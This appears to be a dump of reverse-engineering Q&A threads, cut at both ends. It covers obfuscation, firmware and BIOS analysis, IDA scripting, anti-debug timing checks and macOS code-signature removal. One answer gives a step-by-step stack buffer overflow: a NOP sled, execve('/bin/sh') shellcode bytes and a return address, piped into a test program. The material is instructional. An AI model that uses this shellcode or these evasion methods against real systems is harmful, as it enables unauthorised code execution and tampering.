<p>You can convert it back easily, though, for example with this Python snippet:</p>

<pre><code>&gt;&gt;&gt; import struct
&gt;&gt;&gt; struct.unpack('&gt;i', 'f8ba38ae'.decode('hex'))[0]
-122013522
</code></pre>
","2380"
"How to obfuscate x86 assembly code?","1495","","<p>For my project, I am performing a kind of checksum operation on a portion of code to protect it and therefore do not want its template to be easily visible and therefore need obfuscation.</p>

<p>I have searched a lot on the net and read papers describing obfuscation definitions, types, etc. But there seems to be no tutorial on obfuscating x86 assembly code. Can anybody suggest a simple algorithm/tool for the same?</p>

<p>I have read about inserting dummy code, changing the order of the instructions and other techniques but they appear to be totally random i.e. there is no end to how much dummy code to insert, etc.</p>

<p>Can somebody at least guide me to the correct approach? </p>
","<p>You should not confuse ""code protection"" and ""code obfuscation"". ""Code protection"" techniques target in recognizing code modifications (you mention a checksum) and take suitable means like crashing or delivering wrong results when tampering with the code has been recognized. Anti-Debug measures also belong into this category.</p>

<p>""Code obfuscation"" in a binary targets in blinding the investigator (and the disassembler) with awkward and often useless code, ranging from simple jmp chains to more complicated constructs. Most code obfuscation techniques result in some code bloat, and the tradeoff between the obfuscation and the performance must be considered. Here are two obfuscation examples being found ""in the wild"".</p>

<ul>
<li>Dummy code: There are many means to insert nops in binaries. Examples range from simple statemens like shr eax, 0 or (in the 32-bit world) shl bx, 20h to more complicated constructions like the following example. The combination of jz and jnz followed by garbage statements (cpuid, ret), avoiding a jmp often confuses disassemblers in their ability to display logical assembly blocks.</li>
</ul>

<p><code>
    mov si, si
    mov esp, ebp
    jnz loc_abcd
    xchg edi, esi
    mov cl, cl
    xchg esi, edi
    mov di, di
    jz loc_dcba ; followed by a jmp to loc_abcd
    cpuid
    ret
</code>
In the example, the only ""real"" statement is the mov esp, ebp.</p>

<ul>
<li>Complicate simple assembly constructs. You may write a simple jmp as a combination of a push and a ret. Or, if you don't like the ""ret"" statement, you may replace it by (in 64-bit code):
<code>
lea     rsp, [rsp+8]
jmp   qword ptr[rsp-8]
</code></li>
</ul>

<p>Many more, and much more complicated examples can be found. If you want to dive into this matter, you need practice, as in all SW reversing. Get a protected and/or obfuscated binary like a game or a dongle protector and train. In the literature (e.g. the excellent IdaPro book by Chris Eagle) you may find some obfuscation constructs as well.</p>

<p>Have fun!</p>
","12509"
"Reverse Engineering MIPS Bootloader","1492","","<p>I am trying to figure out how the bootloader of a TP-Link wr702n device (based on an AP121 MIPS board) starts the operation system (VxWorks 5.5.1). The bootloader is extracted from a firmware update file and is a binary (no ELF, PE,...). I am stuck with the next step. IDA Pro disassembles some functions but (I guess) it needs further information about the ROM start address, loading address, and offset to do it properly. Where can I find these information?</p>

<p>I have no RE experience and I am doing this for fun/education. Any hints about further reading or next steps would be great.</p>
","<p>As you guessed correctly, you have to find out the correct starting address of the bootloader image. Based on the bootloader in the latest firmware image (TL-WR702N_V1_141203) I recommend you to try 0x80400000 as the start address.<p>
Although I don't know a simple and exact method to calculate the start address I try to explain a little bit more how can you found this anyway.<p>
You can try the following techniques:
<li>Identify function starts and pointers to the functions and try to match them. If you disassemble the whole binary, the function start addresses can be determined very accurately. So, you can collect the relative start addresses. In most of the binaries and bootloaders, after the code section you will find various data items such as pointers to functions. If you can identify some of these pointers, you can try to find the corresponding relative address.
<li>You can find hints from the code itself. Although the bootloader uses relative branches, the data items are accessed with absolute addresses. In the figure, you can find the absoulte addresses as 0x804B7F10 and so on.<br>
<a href=""https://i.stack.imgur.com/aLbuS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/aLbuS.png"" alt=""enter image description here""></a>
<br>
Based on this address and the length of the code area (0x9B6A4) you may have intelligent guesses, such as 0x80400000 or 0x80408000 or similar.</p>
","11105"
"How can BIOS routines be disassemblied?","1488","","<p>There was once a disassembler on DOS named <strong>Sourcer</strong> that can disassembly BIOS routines. However, how do we access to BIOS ROM from software to do such a thing?</p>
","<p>In the old days, you could usually dump the high part of the 1MB memory (e.g. E000:0000 to F000:FFFF) to retrieve the copy of your BIOS ROM, but nowadays the BIOS no longer fits into 64K or even 128K so all that you'd get would be a copy of the UEFI's CSM (Compatibility Support Module) with most of the code elsewhere, usually above the 1MB mark. </p>

<p>To retrieve the actual, full BIOS code, you need to read the ROM from the flash chip. This may be possible from the same machine, e.g. by using <a href=""https://www.flashrom.org/"">flashrom</a> or sometimes the board vendor's firmware update tool if it offers a ""backup"" option. Sometimes the access to the flash may be blocked from the OS (to prevent BIOS modification by malware) and  in such cases you may have to use an external flash programmer.</p>

<p>Once you got the copy of the ROM, you can start disassembling it. However, keep in mind that modern BIOSes usually implement the UEFI standard, where only a small part of the code (around the reset vector) is 16-bit while most of the code runs in 32-bit (or 64-bit) protected mode, usually using modules implemented in the PE(Portable Executable) format. Since even the structure of the UEFI firmware's ROM is standardized, you can often use a tool such as <a href=""https://github.com/LongSoft/UEFITool"">UEFITool</a> to extract individual modules for analysis. For more info on UEFI, see the UEFI and PI standards, available for free from <a href=""http://www.uefi.org/specifications"">www.uefi.org</a>.</p>
","12777"
"Syntax errors when decompiling with JD-GUI","1487","","<p>I am aware that when decompiling a jar file, it is normal for the resulting .java files to contain syntax errors, but I am unsure of why and worse off I am sometimes unsure of how to fix these syntax errors. Take <code>int[] arrayOfInt = new int['Â€'];</code>, for example. Eclipse complains that <code>'Â€'</code> does not belong. Surprise! I know this already, but why does this happen. How can I find out what this value should be?</p>
","<p>The reason it happens is because JD-Gui isn't encoding unicode properly. You can see that the thing inside the quotes is two bytes, and appears to be interpreted as nonstandard upper 128 characters. I.e. JD-Gui is emitting unicode, but the charset isn't declared correctly so your editor interprets it as two raw bytes in an 8bit charset instead of a single unicode character.</p>

<p>One solution is to use a Decompiler that emits unicode escapes instead of raw unicode byte sequences. That way, any editor will be able to view it correctly. I'd recommend Procyon (it's a lot better than JD-Gui anyway).</p>
","6590"
"Find the kernel structure that contains device name","1482","","<p>I'm using WinDbg to try enumerate drivers and their associated devices. Getting the driver name is very easy. It is found in the <a href=""http://msdn.moonsols.com/win7rtm_x86/DRIVER_OBJECT.html"" rel=""nofollow"">_DRIVER_OBJECT</a> structure. Unfortunately, the <a href=""http://msdn.moonsols.com/win7rtm_x86/DEVICE_OBJECT.html"" rel=""nofollow"">_DEVICE_OBJECT</a> does not contain the name of the device. </p>

<p>Using the <code>!devobj</code> command I can see the name of the device, but I would like to find the table/structure that contains the name.</p>
","<p>So assuming like you said, you have the linear address of your device object, use the windbg extension <code>!object 0xlinearaddress</code>. Based on your windows build, it will display the linear address of the object header. Which in memory exists right below the object.</p>

<p>Use windbg to parse the <code>OBJECT_HEADER</code> structure for you. Starting with Windows 7 you are going to have a member called <code>InfoMask</code>, earlier versions have <code>NameInfoOffset</code>. </p>

<p>If you have an earlier build, <code>NameInfoOffset</code> is subtracted from the linear base of the object header, to get you the base of an <code>OBJECT_HEADER_NAME_INFO</code> structure for that object.</p>

<p>If you have a Windows 7 build or later, <code>InfoMask</code> is a bitmask describing other creator structures that exist before the beginning of the header. It is computed using the <code>ObInfoMaskToOffsetTable</code> which contains the offset to the <code>OBJECT_HEADER_NAME_INFO</code> structure for the object. It is always at a constant location but the <code>InfoMask</code> should be used to determine if the object is named, because not all objects are required to be named.</p>

<p>So a quick example for you, let's say you have a device object at <code>fffffa8001234560</code>. Let's also presume you are using Windows 7 x64.</p>

<p>Your name info would be:</p>

<pre><code>dt nt!_object_header_name_info fffffa8001234560-0x30-0x20
</code></pre>

<p>-0x30 to base of header
-0x20 because in this case <code>InfoMask</code> used in the table has an index value of 0x20.</p>

<p>This structure contains the name <strong>relative</strong> to it's object directory. </p>

<p>Also have a look at the exported kernel routine <code>ObQueryNameInfo</code>.</p>
","3234"
"Pydasm: Disassembling limited length executable shellcode","1477","","<p>How to disassemble first 200 bytes of an executable code using <a href=""https://code.google.com/p/libdasm/"" rel=""nofollow"">pydasm library</a> in Python?
I want to know how to set size of buffer to disassemble it.</p>
","<p>Slightly modified version from pydasm's <a href=""https://code.google.com/p/libdasm/source/browse/trunk/pydasm/README.txt?r=2"">README.txt</a></p>

<pre><code>import pydasm
import binascii

# Open, and read 200 bytes out of the file,
# while converting buffer to hex string
with open('file.bin','r') as f:
    buffer = binascii.hexlify(f.read(200))


# Iterate through the buffer and disassemble 
offset = 0
while offset &lt; len(buffer):
   i = pydasm.get_instruction(buffer[offset:], pydasm.MODE_32)
   print pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, 0)
   if not i:
     break
   offset += i.length
</code></pre>

<p>ADDED:</p>

<p>You also can play with <code>seek()</code> to go to certain position of the file, and then read from there. It is particular useful if you want to read shellcode embedded into some file and you know relative position. You will have to <code>open()</code> the file with ""b"" option for it to work. Consult <a href=""http://docs.python.org/release/2.4.4/lib/bltin-file-objects.html"">Python File Object Library Reference</a> for details.</p>
","2597"
"Automating a Decryption function call in IDA Python","1473","","<p>I'm trying to figure out a way to automatically decrypt certain strings in a binary called by a function several times.</p>

<p>The function takes three arguments and is a simple xor decryption. However it uses a different key for each unique string it wants to decrypt.</p>

<pre><code>char* decrypt(char* string_to_decrypt, uint string_len, char xor_byte)
</code></pre>

<p>What I'm attempting to do is get a list of the xrefsTo this function (This is as far as I got) and read in the current string it wants to decrypt in the binary, and grab the xor key and length, then patch the binary to display the plaintext strings.</p>

<p>The function is called like this</p>

<pre><code>.text:0040168A push    83h
.text:0040168F push    9
.text:00401691 mov     eax, esi
.text:00401693 mov     edx, offset unk_406D58
.text:00401698 call    decrypt_string
</code></pre>

<p>Where EDX, always holds the address of the encrypted string, and the two pushes are the key and length (9 length, 0x83 key)</p>

<p>The mov eax, esi isn't always present. Is there a way to read the disassembly and get this function and then just dynamically decrypt all the strings in the database? </p>

<p>For completeness this is where I started.</p>

<pre><code>import idaapi
import idc

ea = here()
print hex(ea)

xrefs = CodeRefsTo(ea,0)
    for xref in xrefs:
    print ""Ref Addr: {}"".format(hex(xref))

# for all xrefs, get string offset, length and key,
# decrypt that string, and patch or rename it to display decrypted string)
</code></pre>

<p>Thank you.</p>

<p>EDIT:
w-s response got me in the right direction. Here is what I came up with. It's rough, I know :)</p>

<pre><code>import idaapi
import idc
import idautils

ea = here()
xrefs = CodeRefsTo(ea,0)

data = []
decrypted = []

for xref in xrefs:
    current_x = xref
    d = {}
    d['addr'] = hex(current_x)
    n_pushes = 0
    n_movedx = 0

    for i in xrange(6):
        if n_pushes == 2 and n_movedx == 1:
            break

        current_x = idc.PrevHead(current_x)
        instr = idautils.DecodeInstruction(current_x)
        if instr.itype == idaapi.NN_push:

            if n_pushes &lt; 1:
                d['len'] = int(GetOperandValue(current_x, 0))

            if n_pushes == 1:
                d['key'] = int( hex(GetOperandValue(current_x, 0)), 16)

            n_pushes += 1

        if instr.itype == idaapi.NN_mov:
            if GetOpnd(current_x, 0) == 'edx':
                d['string_offset'] = GetOperandValue(current_x, 1)

    data.append(d)
......
</code></pre>
","<p>When I did something similar I used <code>idc.PrevHead(ea)</code>to iterate back from the call site, so it was something similar to this:</p>

<pre><code># Not tested, even not runned even once
# expect errors, use on your own risk 
# probably parsing and analysing disassembly is not best way to do it

import idc
import idautils


ea = idc.ScreenEA()

xrefs = CodeRefsTo(ea,0)
for xref in xrefs:
    current = xref
    numOfPushes = 0
    numOfEdx = 0
    edxes = []
    pushes = []
    for i in range(10): # taking 10 instructions back
        if numOfEdx == 1 and numOfPushes == 2:
            break
        current = idc.PrevHead(current)
        s = idc.GetDisasm(current)
        if s.find(""mov edx"") != -1: #copy-paste exact string here, tabulation expected
            edxes.append(s)
            numOfEdx += 1
        if s.find(""push"")!= -1: 
            pushes.append(s)
            numOfPushes += 1
    if len(edxes) &gt; 0:
        print ""%08x : EDX instruction "" % xref, edxes[0]
    else:
        print ""%08x : EDX mov not found"" % xref
    if len(pushes) &gt;= 2:
        print ""%08x : Push[0] "" % xref, pushes[0]
        print ""%08x : Push[1] "" % xref, pushes[1]
    else:
        print ""%08x : can not find appropriate push instructions"" %  xref
</code></pre>

<p>When you have your instructions, all the rest should be obvious.
Good luck.</p>
","11334"
"Importing list of functions and addresses into WinDbg","1473","","<p>When I have a kernel module without symbols, I'd typically first open it in IDA and give names to some of the subroutines (those I'm interested in).</p>

<p>Since I prefer my kernel debugging with plain WinDbg (and not the IDA-integrated WinDbg), I'd like WinDbg to recognize the names IDA (and me) gave to those addresses. That way, a) I could break on those functions by name, change variables by name, and b) WinDbg's output and views would read better (in stack traces etc.).</p>

<p>Unfortunately, IDA has no ""create PDB"" feature, and I don't even see a non-PDB way of importing addresses into WinDbg.</p>

<p>Ideas, anyone?</p>
","<p><a href=""http://www.woodmann.com/forum/entry.php?262-addsym-windbg-extension-%28extension-to-load-names-from-ida-to-windbg%29"" rel=""nofollow"">This page contains an IDC script And a Windbg Extension </a> to dump the names and a WinDbg extension to load those names into WinDbg.</p>
","3920"
"How to detect a debugger using some ""time"" checking strategies?","1469","","<p>I have seen several anti-debug strategies, and I am wondering if there are some anti-debugger methods that can evaluate the program running time, thus detecting the exist of debugger.</p>
","<p>This is pretty broad subject :-) There are several examples:</p>

<ol>
<li><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms724408%28v=vs.85%29.aspx""><code>GetTickCount()</code></a> - Retrieves the number of milliseconds that have elapsed since the system was started. Putting those in different parts of the program and then checking the difference can give you some primitive detection.</li>
<li><a href=""http://www.cplusplus.com/reference/ctime/time/""><code>time()</code></a> - Get the current calendar time.</li>
<li><a href=""http://faydoc.tripod.com/cpu/rdtsc.htm""><code>RDTSC</code></a> - Gets the current value of the processor's time-stamp counter. This one could be hard to find if placed wisely.</li>
</ol>

<p>The thing is, that all those could be neutralized once the researcher became aware of them. There are various debugger plugins which will make that happen by patching APIs, installing drivers and etc. Of course, it could be done manually in most cases.</p>

<p>What you really should think of is placing and integrating those inside your code, so it will be less evident what the real purpose of the calls to the APIs/instruction. </p>
","3479"
"Can I invoke IDA's plugin BinDiff from command line?","1458","","<p>I am trying to evaluate a very large amount of binaries (thousands) using <code>BinDiff</code>, and currently I only need some instruction level statistics from  BinDiff, which can be acquired from its dumped <code>sqlite</code> file easily. </p>

<p>But my problem is that testing thousands of binaries using the GUI of IDA/BinDiff looks too time consuming..  </p>

<p>I am wondering can I invoke plugins of IDA-Pro, in particular, <code>BinDiff</code>, from command line and dump its output out? Is it possible to do so?  </p>

<p>I have some experience to use command line ida, but that only limits to execute some IDAPython scripts.  </p>

<p>The test is on Windows 7, with IDA-Pro 6.6 and BinDiff 4.1. </p>
","<p>You can try the following steps:</p>

<ol>
<li><p>convert binary file to IDB:</p>

<pre><code>$IDA_PATH\\idaq.exe -B -p+ $FILE_TO_CONVERT
</code></pre></li>
<li><p>create <code>BinExport</code> from idb</p>

<pre><code>$IDA_PATH\\idaq.exe -A -SC:\\bindiff_export.idc
</code></pre>

<p>where <code>bindiff_export.idc</code> looks like:</p>

<pre><code>#include &lt;idc.idc&gt;
static main()
{
    Batch(0);
    Wait();
    Exit( 1 - RunPlugin(""zynamics_binexport_5"", 2 ));
}
</code></pre></li>
</ol>

<p>Should you also want to diff files, you can use BinDiff directly on <code>BinExports</code>:</p>

<pre><code>$PATH_TO_BINDIFF\\bin\\BinDiff_Deluxe.exe -i $BIN_EXPORT_A -j $BIN_EXPORT_B -o $OUTPUT
</code></pre>
","8499"
"Conflict of OllyDbg plugins","1448","","<p>I have recently started using plugins for OllyDbg 1.10. Thanks to this <a href=""https://tuts4you.com/download.php?list.9"" rel=""nofollow"">site</a>, I have an idea of the capabilities of the plugins for OllyDbg. </p>

<p>As I have only a very basic idea of how plugins work, I was wondering, do plugins interfere with each other? For example, if I use multiple plugins that deals with the same anti-debugging techniques, is it possible that they may conflict with each other and mess with what I would ideally want, which is to hide my debugger? Thanks!</p>
","<p>It is quite possible for Ollydbg's plugin to interfere with each other. Generally you should only keep plugins that you use. </p>

<p>The best anti-debugging plugins for Ollydbg as of now are <em><a href=""https://bitbucket.org/NtQuery/scyllahide"" rel=""nofollow"">ScyllaHide</a></em> for user-mode and <em><a href=""https://bitbucket.org/mrexodia/titanhide"" rel=""nofollow"">TitanHide</a></em> for kernel mode. Both of them are open source and well maintained.</p>
","8787"
"IDA Pro converting to instruction functionality: how to automate.","1447","","<p>I am loading various files that read into IDA as binary. Once I have the GUI in front of me I am able to go through the segments and hit ""c"" in order to convert to instruction/code.</p>

<p>However, I am primarily trying to do all my ida work via linux terminal (using the command line <code>./idal -B input-file</code>). 
Is there a command line flag, or another method, to automate the generating of instructions from the binary files? Or is this something I will have to manually do every time?</p>
","<p>I would do something like this in IDAPython:</p>

<pre><code># I didn't check this code, please use carefully !This code will pass through all defined segments and will try to make code on any unexplored area
# IDAPython documentation is at https://www.hex-rays.com/products/ida/support/idapython_docs/

import idautils
import idc

for ea in idautils.Segments():
    segend = idc.GetSegmentAttr(ea, idc.SEGATTR_END)
    start = ea
    while start &lt; segend:
        idc.MakeCode(start)
        start = idc.FindUnexplored(start+1, idc.SEARCH_DOWN)
</code></pre>

<p>You can run it with <a href=""https://www.hex-rays.com/products/ida/support/idadoc/417.shtml"" rel=""nofollow"">-S</a> command line switch as stated in previous answer</p>
","3394"
"Strcpy BufferOverflow get shellcode location for EIP","1446","","<p>I am trying to get a shellcode, exploiting a C program with a <code>strcpy()</code> function.</p>

<p>I have found out that I need 68 bytes to start writing on the <code>EIP</code>. So, if I write 72's by <code>EIP</code> register is <code>0x41414141</code>.</p>

<p>What I want is to insert a 23 bytes shellcode for a x86 OS. So I know that I need this:</p>

<ul>
<li>68 A bytes - 23 shellcode bytes:  45 <code>NOPs</code>. </li>
<li>23 bytes Shellcode.</li>
<li>4 bytes for the <code>EIP</code> register, pointing the start of the shellcode.</li>
</ul>

<p>I don't know how to carry this out. This is my program:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void cambiarEIP() {
    printf(""\n Has cambiado el valor del EIP, enhorabuena\n"");
}

int main(int argc, char * argv[]) {
    char buf[64];

    if(argc == 1) {
        printf(""Uso: %s entrada\n"", argv[0]);
        return -1;
    }

    strcpy(buf,argv[1]);
    printf(""%s\n"", buf);

    return 0;
}
</code></pre>

<p>I want to insert this as a parameter: <code>45As+shellcode+EIP</code> DIR.</p>

<p>This is what I get with the GDB when passing 71 bytes as a parameter:</p>

<pre><code> Program received signal SIGSEGV, Segmentation fault.
 0x00414141 in ?? ()
</code></pre>

<p>And those are my registers:</p>

<pre><code>(gdb) i r
eax            0x0  0
ecx            0xb7fbc4e0   -1208236832
edx            0xb7fbd360   -1208233120
ebx            0xb7fbbff4   -1208238092
esp            0xbffff4a0   0xbffff4a0
ebp            0x41414141   0x41414141
esi            0x0  0
edi            0x0  0
eip            0x414141 0x414141
eflags         0x10246  [ PF ZF IF RF ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0  0
gs             0x33 51
</code></pre>

<p>I know that I need something like this:</p>

<pre><code>./shell \x41\*45 + ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69""
          ""\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"" + Shellcode location
</code></pre>

<p>How to carry this out?</p>
","<blockquote>
  <p>68 A bytes - 23 shellcode bytes: 45 NOPs.</p>
</blockquote>

<p>NOP is the mnemonic that stands for No OPeration which is the byte \x90, meaning that you'll have to change the A's (\x41) for NOPs (\x90), because \x41 by itself it's not a valid ASM instruction in the x86 processor hence making your program crash.</p>

<p>Taking this into account, first part goes like: </p>

<pre><code>python -c 'print ""\x90""*45' &gt; payload.bin
</code></pre>

<blockquote>
  <p>23 bytes Shellcode</p>
</blockquote>

<p>This is self explanatory, just add your shellcode:</p>

<pre><code>python -c 'print ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80""' &gt;&gt; payload.bin
</code></pre>

<blockquote>
  <p>4 bytes for the EIP register, pointing the start of the shellcode.</p>
</blockquote>

<h1>Here's the tricky part:</h1>

<p>First ask yourself a few questions:</p>

<ol>
<li>Does the system have ASLR enabled?</li>
<li>Does it have DEP enabled?</li>
<li>NX?</li>
</ol>

<p><a href=""https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx"">Read this if the answer is that you don't know</a></p>

<p>And if the answer to both of these is <strong>no</strong> then, continue to check into gdb the following</p>

<ol>
<li><a href=""https://stackoverflow.com/questions/10483544/stopping-at-the-first-machine-code-instruction-in-gdb"">Set a breakpoint at program's entry point in gdb</a></li>
<li>Step in gdb until you get to the call to strcpy (id est, when the overflow happens)</li>
<li>Get the location of your <em>buf</em> variable in stack. We can do so by writing the next command in gdb since the Stack Pointer is pointing right at the beginning of <em>buf</em>

<ul>
<li><code>x/32xb $esp</code></li>
</ul></li>
</ol>

<p>Now that you have the location of your <em>buf</em> variable, which should be something in the form <code>0xbffff5f0</code>. Now get that memory position and add it to the end of your payload. You need this position in order to jump to the location of your <em>buf</em> variable and execute the shellcode in it...</p>

<h1>But hold on!</h1>

<p>You still have to take <a href=""https://en.wikipedia.org/wiki/Endianness"" rel=""nofollow noreferrer"">endianness</a> into account, which in your system is little endian.</p>

<p>So you'll need to write that memory position in little endian which, if you are lazy like me, you'll end up <a href=""https://github.com/n30m1nd/pyndianizer"" rel=""nofollow noreferrer"">writing a script that makes it for you</a>:</p>

<p><code>python pyndianizer.py 0xbffff5f0</code> ==> <code>\xf0\xf5\xff\xbf</code></p>

<p>Now, add it to your payload
<code>python -c 'print ""\xf0\xf5\xff\xbf""' &gt;&gt; payload.bin</code></p>

<h1>And for the grand finale:</h1>

<p><code>cat payload.bin | ./shell</code></p>

<p>If everything was done well, just press a few enters and you'll have your shell.</p>

<h1>Final note</h1>

<p><em>Your shellcode runs <code>/bin/sh</code> but just running it doesn't work sometimes because the program ends just after running your shellcode. If so, you'll have to make it wait for user input after <code>cat</code>ing the shellcode in</em></p>
","11064"
"Format of .chk firmware package on WGR614v7","1438","","<p>Note: I'm aware of the technical and legal implications of reverse-enginneering binaries.</p>

<p>I have the firmware for a Netgear WGR614v7 router, in the form of a .chk file, coming from Netgear themselves, and I wish to unpack the file. My understanding is that a firmware .chk file is <a href=""http://www.dd-wrt.com/wiki/index.php/WGR614_v8"" rel=""nofollow"">a header</a> before a TRX image, and I've tried to untrx the ile I had sans header, or with header as well. Neither that nor <code>binwalk</code> succeeded. Two useful strings are seen very close to the beginning of the file:</p>

<ul>
<li>AH00I8</li>
<li>U12H064T00_NETGEAR</li>
</ul>

<p>Inspecting the file in a hex editor, I'm unable to find the <a href=""http://wiki.openwrt.org/doc/techref/header?s%5b%5d=trx"" rel=""nofollow"">TRX file signature</a> (I was looking for ASCII <code>HDR0</code>). I also cannot find any sort of compression magic values, except fairly far into the file where they're not likely to signify the beginning of the actual content I'm looking for. </p>

<p>Am I looking for the wrong filetypes? Is anything about this structure known that I haven't found yet?</p>

<p><strong>Edit:</strong> The firmware has been downloaded from <a href=""http://support.netgear.com/product/WGR614v7"" rel=""nofollow"">Netgear's site</a>. I tried chopping off various lengths but cannot find a reasonably-located compression or TRX header. The characteristic <code>ff ff ff ff</code> of IMG images used as a method of preventing a repetitive boot firmware is also not existent.</p>

<p><strong>Edit 2:</strong> I did some searching of my own, and found a <a href=""http://ttf.mine.nu/techdocs.htm"" rel=""nofollow"">decompression utility</a>. When I chopped the file such that <code>sqz</code> had been the first characters, that utility seemed to find valid Huffman structures but incur a size mismatch. A result of the decompression yielded 11 bytes, while the program warned me:</p>

<blockquote>
<pre><code>Warning: Unpacked file should be 7537274 bytes but is 396409921 bytes! at ./unpack.pl line 61, &lt;STDIN&gt; line 3.
</code></pre>
</blockquote>

<p>Of course, it could be that many kinds of data that is corrupt might be partially readable as huffman giving me strange results as seen here.</p>
","<p>The file begins:</p>

<pre><code>0000000: 4148 3030 4938 e66c 000e aa28 9835 0589  AH00I8.l...(.5..
0000010: 3004 125a 1b39 65ff 47e4 b95c 0001 0014  0..Z.9e.G..\....
0000020: 5531 3248 3036 3454 3030 5f4e 4554 4745  U12H064T00_NETGE
0000030: 4152 0000                                AR..
</code></pre>

<p>The reason for picking this size will soon become clear.</p>

<p>The first four bytes (<code>AH00</code>) are probably file magic. Googling just that string brings up <a href=""http://www.0xf8.org/2009/07/hacking-the-netgear-wg102-access-point/"" rel=""nofollow"">this page</a>, which has a detailed breakdown of a different firmware file with a similar structure.</p>

<p>The next four bytes are not described by the linked page. Reading them as a 32-bit big-endian value (BE32), though, you get 0x4938e66c = 1228465772, which is plausibly a recent UNIX timestamp (usually values from around 800,000,000 to 1,500,000,000). Indeed, it decodes to <code>Fri Dec  5 08:29:32 2008 GMT</code>, which is plausibly the build date of the hardware (and I note that the linked article has 0x481ac265 = <code>Fri May  2 07:27:33 2008 GMT</code>, which also seems plausible).</p>

<p>The next four bytes read as a BE32 value give 961064. The total filesize is 961116 bytes, so this is likely the payload size, leaving 52 bytes for the header (and thus explaining why I chose to show the first 52 bytes here).</p>

<p>The next 32 bytes are the MD5 sum of the payload as indicated by the linked page. I deleted the first 52 bytes and MD5 summed the result:</p>

<pre><code>983505893004125a1b3965ff47e4b95c  /tmp/fw.sqz
</code></pre>

<p>which is exactly what the header contains.</p>

<p>The next two bytes are unknown.</p>

<p>The next two bytes are 0x0014, which is the length of the string that follows (including two padding NULs). While I'm not familiar with Netgear routers, I'm guessing this is a model/revision number for the hardware target.</p>

<p>And there you go: that's the <code>.chk</code> file header.</p>

<pre><code>char magic[4];
uint32_t timestamp; // UNIX timestamp
uint32_t payload_size;
char md5sum[32];
uint16_t unknown; // = 1 on all files seen so far
uint16_t model_size;
char model[model_size];
</code></pre>

<hr>

<p>In the original linked page, the payload was a plain ELF file. Unfortunately, in your firmware, the payload is some other kind of file, with the magic <code>sqz</code> (""squeeze""?). It's clearly compressed, but I can't tell what it's compressed with. For now, this will have to be an incomplete answer until someone figures out what the compression format is.</p>
","4576"
"Remove code signature from a Mac binary","1438","","<p>How can I remove the code signature from a binary so that I can patch it without the binary refusing to run afterwards?</p>

<p><em>Needless to say, I'm not the original creator of the binary, nor I have the certs that were used to sign the binary.</em></p>
","<p>There are <a href=""https://github.com/steakknife/unsign"" rel=""nofollow noreferrer"">tools</a> for <a href=""https://github.com/alexzielenski/optool"" rel=""nofollow noreferrer"">that</a>, as well as a <code>codesign</code> flag <code>--remove-signature</code></p>

<p>First two should work the same. The <code>codesign</code> flag is undocumented and so YMMV (A user reported in a comment the <code>codesign</code> produced a corrupt executable).</p>

<p>You should use any of them with caution and backup the application before using them.</p>
","13623"
"How to rebase IDA to match GDB","1434","","<p>I would like to debug my elf file on linux using GDB and follow the disassembly in IDA, is this possible? And if it is how would I rebase IDA to match with GDB?</p>

<p>Thanks!</p>
","<p>If you are trying to rebase an elf, you could do <code>info proc mappings</code>. This will show you all of the mapped addresses. (This could also be viewed by doing <code>cat /proc/&lt;pid&gt;/map</code>)</p>

<p>Then just rebase your IDA via EDIT->Segments->Rebase program and select <code>Image Base</code> from the radio buttons.</p>

<p>Ex: </p>

<pre><code>(gdb) info proc mappings 
process 12383
Mapped address spaces:
    Start Addr   End Addr       Size     Offset objfile
     0x8048000  0x8049000     0x1000          0      /home/user/my_elf
     0x8049000  0x804a000     0x1000          0      /home/user/my_elf
     0x804a000  0x804b000     0x1000     0x1000      /home/user/my_elf
    0xb7e73000 0xb7e74000     0x1000          0
    0xb7e74000 0xb7fbd000   0x149000          0     /lib/i386-linux-gnu/libc-2.13.so
    0xb7fbd000 0xb7fbe000     0x1000   0x149000     /lib/i386-linux-gnu/libc-2.13.so
    0xb7fbe000 0xb7fc0000     0x2000   0x149000     /lib/i386-linux-gnu/libc-2.13.so
    0xb7fc0000 0xb7fc1000     0x1000   0x14b000     /lib/i386-linux-gnu/libc-2.13.so
    0xb7fc1000 0xb7fc4000     0x3000          0
    0xb7fdf000 0xb7fe1000     0x2000          0
    0xb7fe1000 0xb7fe2000     0x1000          0           [vdso]
    0xb7fe2000 0xb7ffe000    0x1c000          0     /lib/i386-linux-gnu/ld-2.13.so
    0xb7ffe000 0xb7fff000     0x1000    0x1b000     /lib/i386-linux-gnu/ld-2.13.so
    0xb7fff000 0xb8000000     0x1000    0x1c000     /lib/i386-linux-gnu/ld-2.13.so
    0xbffdf000 0xc0000000    0x21000          0           [stack]
</code></pre>

<p>If I would be looking at the elf in IDA i would use 0x8048000 for the base. If I would be looking at libc-2.13.so I would use 0xb7e74000.</p>

<p>Hope that helps. </p>
","6845"
"How to read NSCR1000 data files?","1433","","<p>Terminal app on OSX stores the information about its windows and content in its state files in <code>Library/Saved Application State/com.apple.Terminal.savedState</code>.</p>

<p>I did the backup of the file before the crash to be able to restore my data, but I don't know how to read it now (as Terminal refuses to use it). It starts with: <code>NSCR1000</code> as below:</p>

<pre><code>$ hexdump -Cn8 ~/Library/Saved\ Application\ State/com.apple.Terminal.savedState/data.data
00000000  4e 53 43 52 31 30 30 30                           |NSCR1000|
</code></pre>

<p>It's used by <code>windows.plist</code> file which can be decoded by:</p>

<pre><code>plutil -convert xml1 -o windows.plist windows.plist
</code></pre>

<p>What kind of method I can use to read that <code>.data</code> file? Or where do I start?</p>

<pre><code>$ strings data.data | head -10
NSCR1000
p+5v
0&gt;[t
kJX6X
@NSCR1000
</code></pre>

<p>This file is automatically generated by Terminal app when you start and start typing something, so the terminal data is stored there.</p>
","<p>It is encrypted with AES so you will need the keys from <code>windows.plist</code> to decode.</p>

<p>The format is (all stored in big-endian):</p>

<pre><code>offset  value
0-3     magic ('NSCR' for PersistentUIRecord)
4-7     version (either '1000' or '0006')
8-11    NSWindowID (used to lookup 128-bit AES key stored in windows.plist)
12-15   record length (including from 0 to xxx)
